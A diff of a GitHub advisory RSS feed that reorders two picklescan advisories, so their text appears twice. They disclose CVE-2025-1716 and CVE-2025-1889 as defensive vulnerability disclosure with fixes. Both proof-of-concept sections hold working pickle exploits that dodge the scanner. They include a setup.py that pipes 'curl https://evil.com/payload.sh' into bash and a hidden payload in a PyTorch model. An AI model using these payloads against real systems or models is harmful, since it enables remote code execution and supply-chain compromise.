@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-03-06T14:01:30.423Z</updated>
+    <updated>2025-03-06T15:01:22.024Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,169 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
+        <id>https://github.com/advisories/GHSA-655q-fx9r-782v</id>
+        <link href="https://github.com/advisories/GHSA-655q-fx9r-782v"/>
+        <updated>2025-03-06T14:52:21.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="cve-2025-1716">CVE-2025-1716</h3>
+<h3 id="summary">Summary</h3>
+<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited to run pip install and fetch a malicious package, enabling remote code execution (RCE) upon package installation.</p>
+<h3 id="details">Details</h3>
+<p>Pickle’s deserialization process allows execution of arbitrary functions via the <strong>reduce</strong> method. While Picklescan is designed to detect such exploits, this attack evades detection by leveraging pip.main() as the callable function. Since pip is a legitimate package operation, it may not raise red flags in security scans.</p>
+<p>The payload executes the following steps:</p>
+<ol>
+<li>During unpickling, it calls pip.main() to install a malicious PyPI package.</li>
+<li>The installed package runs arbitrary code via setup.py, entry_points, or post-install hooks.</li>
+<li>Execution is silent, with minimal logging to avoid detection.</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p>Step 1: Create the Malicious Package
+Host a PyPI package with a malicious setup.py or entry_point.</p>
+<p>Example malicious <code>setup.py</code></p>
+<pre><code>from setuptools import setup
+import os
+
+os.system("curl -s https://evil.com/payload.sh | bash")  # Executes remote shell script
+
+setup(
+    name="rsac-demo-package",
+    version="0.1",
+    packages=["rsac_demo"],
+    install_requires=[],
+)
+</code></pre>
+<p>Upload it to PyPI or host on GitHub.</p>
+<p>Step 2: Exploit via Pickle</p>
+<pre><code>import pickle
+import pip
+
+class Exploit:
+    def __reduce__(self):
+        return pip.main, (
+            ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',
+             '--exists-action', 'i', '--isolated'],
+        )
+
+malicious_pickle = pickle.dumps(Exploit())
+
+# Simulating deserialization attack
+pickle.loads(malicious_pickle)
+</code></pre>
+<p>This installs a malicious package from GitHub or PyPI.
+The payload runs automatically when unpickled, executing any code inside the installed package leveraging the <code>setup.py</code> file.</p>
+<h3 id="impact">Impact</h3>
+<p>Remote Code Execution (RCE): Any system that deserializes a malicious pickle is compromised.
+Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.
+Bypasses Picklescan: Security tools may not flag pip.main(), making it harder to detect.</p>
+<h3 id="recommended-fixes">Recommended Fixes</h3>
+<p>Add  <code>"pip": "*"</code> to the list of <a href="https://github.com/mmaitre314/picklescan/blob/25d753f4b9a27ce141a43df3bf88d731800593d9/src/picklescan/scanner.py#L96">unsafe globals</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1716">https://nvd.nist.gov/vuln/detail/CVE-2025-1716</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d">https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d</a></li>
+<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716</a></li>
+<li><a href="https://github.com/advisories/GHSA-655q-fx9r-782v">https://github.com/advisories/GHSA-655q-fx9r-782v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-655q-fx9r-782v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-03T20:05:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions]]></title>
+        <id>https://github.com/advisories/GHSA-769v-p64c-89pr</id>
+        <link href="https://github.com/advisories/GHSA-769v-p64c-89pr"/>
+        <updated>2025-03-06T14:52:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="cve-2025-1889">CVE-2025-1889</h3>
+<h3 id="summary">Summary</h3>
+<p>Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.</p>
+<h3 id="details">Details</h3>
+<p>Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.</p>
+<p>A typical attack works as follows:</p>
+<ul>
+<li>A PyTorch model (model.pt) is created and saved normally.</li>
+<li>A second pickle file (config.p) containing a malicious payload is crafted.</li>
+<li>The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.</li>
+<li>Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.</li>
+<li>The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<pre><code>import os
+import pickle
+import torch
+import zipfile
+from functools import partial
+
+class RemoteCodeExecution:
+    def __reduce__(self):
+        return os.system, ("curl -s http://localhost:8080 | bash",)
+
+# Create a directory inside the model
+os.makedirs("model", exist_ok=True)
+
+# Create a hidden malicious pickle file
+with open("model/config.p", "wb") as f:
+    pickle.dump(RemoteCodeExecution(), f)
+
+# Create a benign model
+model = {}
+class AutoLoad:
+    def __init__(self, path, **kwargs):
+        self.path = path
+        self.kwargs = kwargs
+
+    def __reduce__(self):
+        # Use functools.partial to create a partially applied function
+        # with torch.load and the pickle_file argument
+        return partial(torch.load, self.path, **self.kwargs), ()
+
+model['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)
+torch.save(model, "model.pt")
+
+# Inject the second pickle into the model archive
+with zipfile.ZipFile("model.pt", "a") as archive:
+    archive.write("model/config.p", "model/config.p")
+
+# Loading the model triggers execution of config.p
+torch.load("model.pt")
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Severity: High</p>
+<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.</p>
+<p>What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.</p>
+<p>Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.</p>
+<h3 id="recommendations">Recommendations</h3>
+<ol>
+<li>Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.</li>
+<li>Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.</li>
+<li>Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\x80\x05).</li>
+<li>Block the following globals:
+ - torch.load
+ - Block functools.partial</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr</a></li>
+<li><a href="https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e">https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1889">https://nvd.nist.gov/vuln/detail/CVE-2025-1889</a></li>
+<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889</a></li>
+<li><a href="https://github.com/advisories/GHSA-769v-p64c-89pr">https://github.com/advisories/GHSA-769v-p64c-89pr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-769v-p64c-89pr</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-03T19:59:46.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[spacy-llm] Spacy-LLM Server-Side Template Injection (SSTI) vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-793v-gxfp-9q9h</id>
@@ -114,80 +277,6 @@
         <published>2025-03-03T21:30:59.000Z</published>
     </entry>
     <entry>
-        <title type="html"><![CDATA[[picklescan] Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
-        <id>https://github.com/advisories/GHSA-655q-fx9r-782v</id>
-        <link href="https://github.com/advisories/GHSA-655q-fx9r-782v"/>
-        <updated>2025-03-04T14:30:04.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="cve-2025-1716">CVE-2025-1716</h3>
-<h3 id="summary">Summary</h3>
-<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited to run pip install and fetch a malicious package, enabling remote code execution (RCE) upon package installation.</p>
-<h3 id="details">Details</h3>
-<p>Pickle’s deserialization process allows execution of arbitrary functions via the <strong>reduce</strong> method. While Picklescan is designed to detect such exploits, this attack evades detection by leveraging pip.main() as the callable function. Since pip is a legitimate package operation, it may not raise red flags in security scans.</p>
-<p>The payload executes the following steps:</p>
-<ol>
-<li>During unpickling, it calls pip.main() to install a malicious PyPI package.</li>
-<li>The installed package runs arbitrary code via setup.py, entry_points, or post-install hooks.</li>
-<li>Execution is silent, with minimal logging to avoid detection.</li>
-</ol>
-<h3 id="poc">PoC</h3>
-<p>Step 1: Create the Malicious Package
-Host a PyPI package with a malicious setup.py or entry_point.</p>
-<p>Example malicious <code>setup.py</code></p>
-<pre><code>from setuptools import setup
-import os
-
-os.system("curl -s https://evil.com/payload.sh | bash")  # Executes remote shell script
-
-setup(
-    name="rsac-demo-package",
-    version="0.1",
-    packages=["rsac_demo"],
-    install_requires=[],
-)
-</code></pre>
-<p>Upload it to PyPI or host on GitHub.</p>
-<p>Step 2: Exploit via Pickle</p>
-<pre><code>import pickle
-import pip
-
-class Exploit:
-    def __reduce__(self):
-        return pip.main, (
-            ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',
-             '--exists-action', 'i', '--isolated'],
-        )
-
-malicious_pickle = pickle.dumps(Exploit())
-
-# Simulating deserialization attack
-pickle.loads(malicious_pickle)
-</code></pre>
-<p>This installs a malicious package from GitHub or PyPI.
-The payload runs automatically when unpickled, executing any code inside the installed package leveraging the <code>setup.py</code> file.</p>
-<h3 id="impact">Impact</h3>
-<p>Remote Code Execution (RCE): Any system that deserializes a malicious pickle is compromised.
-Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.
-Bypasses Picklescan: Security tools may not flag pip.main(), making it harder to detect.</p>
-<h3 id="recommended-fixes">Recommended Fixes</h3>
-<p>Add  <code>"pip": "*"</code> to the list of <a href="https://github.com/mmaitre314/picklescan/blob/25d753f4b9a27ce141a43df3bf88d731800593d9/src/picklescan/scanner.py#L96">unsafe globals</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1716">https://nvd.nist.gov/vuln/detail/CVE-2025-1716</a></li>
-<li><a href="https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d">https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d</a></li>
-<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716</a></li>
-<li><a href="https://github.com/advisories/GHSA-655q-fx9r-782v">https://github.com/advisories/GHSA-655q-fx9r-782v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-655q-fx9r-782v</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-03-03T20:05:49.000Z</published>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
         <id>https://github.com/advisories/GHSA-vr75-hjh9-7fr6</id>
         <link href="https://github.com/advisories/GHSA-vr75-hjh9-7fr6"/>
@@ -212,95 +301,6 @@ Bypasses Picklescan: Security tools may not flag pip.main(), making it harder to
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-03-03T18:31:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[picklescan] PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions]]></title>
-        <id>https://github.com/advisories/GHSA-769v-p64c-89pr</id>
-        <link href="https://github.com/advisories/GHSA-769v-p64c-89pr"/>
-        <updated>2025-03-03T22:23:53.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="cve-2025-1889">CVE-2025-1889</h3>
-<h3 id="summary">Summary</h3>
-<p>Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.</p>
-<h3 id="details">Details</h3>
-<p>Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.</p>
-<p>A typical attack works as follows:</p>
-<ul>
-<li>A PyTorch model (model.pt) is created and saved normally.</li>
-<li>A second pickle file (config.p) containing a malicious payload is crafted.</li>
-<li>The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.</li>
-<li>Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.</li>
-<li>The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<pre><code>import os
-import pickle
-import torch
-import zipfile
-from functools import partial
-
-class RemoteCodeExecution:
-    def __reduce__(self):
-        return os.system, ("curl -s http://localhost:8080 | bash",)
-
-# Create a directory inside the model
-os.makedirs("model", exist_ok=True)
-
-# Create a hidden malicious pickle file
-with open("model/config.p", "wb") as f:
-    pickle.dump(RemoteCodeExecution(), f)
-
-# Create a benign model
-model = {}
-class AutoLoad:
-    def __init__(self, path, **kwargs):
-        self.path = path
-        self.kwargs = kwargs
-
-    def __reduce__(self):
-        # Use functools.partial to create a partially applied function
-        # with torch.load and the pickle_file argument
-        return partial(torch.load, self.path, **self.kwargs), ()
-
-model['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)
-torch.save(model, "model.pt")
-
-# Inject the second pickle into the model archive
-with zipfile.ZipFile("model.pt", "a") as archive:
-    archive.write("model/config.p", "model/config.p")
-
-# Loading the model triggers execution of config.p
-torch.load("model.pt")
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Severity: High</p>
-<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.</p>
-<p>What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.</p>
-<p>Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.</p>
-<h3 id="recommendations">Recommendations</h3>
-<ol>
-<li>Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.</li>
-<li>Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.</li>
-<li>Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\x80\x05).</li>
-<li>Block the following globals:
- - torch.load
- - Block functools.partial</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr</a></li>
-<li><a href="https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e">https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1889">https://nvd.nist.gov/vuln/detail/CVE-2025-1889</a></li>
-<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889</a></li>
-<li><a href="https://github.com/advisories/GHSA-769v-p64c-89pr">https://github.com/advisories/GHSA-769v-p64c-89pr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-769v-p64c-89pr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-03-03T19:59:46.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[codechecker] CodeChecker open redirect when URL contains multiple slashes after the product name]]></title>
